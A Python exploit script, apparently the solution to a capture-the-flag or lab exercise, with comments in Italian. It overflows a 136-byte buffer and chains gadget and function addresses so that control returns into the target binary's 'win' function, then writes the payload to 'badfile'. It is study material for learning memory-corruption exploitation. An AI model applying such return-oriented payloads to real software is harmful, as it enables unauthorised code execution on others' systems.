#note

import os
import struct

#find gadget
pop_pop_ret = 0x0804868a

#indirizzo delle funzioni
#con p su peda
win = 0x804857b
join_string = 0x8048549
cpy_string = 0x8048517

#con le stampe da terminale
str1 = 0x804a060
str2 = 0x804a088
str3 = 0x804a0a0

argv = 0xbffff4f6 #per salvare il nome

buf = 0xbffff228 #non si usa

#buffer overflow
payload = "A"*136 #0x88 in decimale e` 136 #********

#dst, src
payload += struct.pack("I", cpy_string) #uso la cpy e metto str1 in str3 vuota
payload += struct.pack("I", pop_pop_ret) #2 input: pop_pop
payload += struct.pack("I", str3) #dst
payload += struct.pack("I", str1) #src

#faccio join con il nome in input
payload += struct.pack("I", join_string)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", str3)
payload += struct.pack("I", argv)

payload += struct.pack("I", join_string)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", str3)
payload += struct.pack("I", str2) #"you win!"

#alla fine bisogna aggiungere win
payload += struct.pack("I", win)

f = open("badfile", "a")
f.write("%s" % payload)
f.close()





